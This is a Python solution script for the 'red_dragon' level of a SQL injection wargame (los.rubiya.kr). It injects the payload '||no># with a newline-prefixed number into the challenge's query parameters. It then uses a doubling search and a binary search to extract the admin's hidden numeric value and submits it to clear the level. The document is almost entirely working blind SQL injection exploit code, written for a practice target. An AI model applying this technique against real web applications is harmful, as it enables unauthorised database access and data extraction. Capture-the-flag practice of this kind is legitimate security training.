from constants import *

chall_url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"

min_value = 1
max_value = None

min_value = 1
max_value = None

curr_value = 1
while max_value is None:
    res = make_request(chall_url,
                       "?id=" + urllib.parse.quote("'||no>#") + "&no=" + urllib.parse.quote(f"\n{curr_value}"),
                       unquote=False)
    if hello_admin in res:
        min_value = curr_value
        curr_value *= 2
    else:
        max_value = min_value * 2

while True:
    mid_value = (max_value + min_value) // 2
    res = make_request(chall_url,
                       "?id=" + urllib.parse.quote("'||no>#") + "&no=" + urllib.parse.quote(f"\n{mid_value}"),
                       unquote=False)
    if hello_admin in res:
        min_value = mid_value
    else:
        max_value = mid_value

    if max_value - min_value == 1:
        break

res = make_request(chall_url, f"?id=admin&no={max_value}")
check_clear(res)
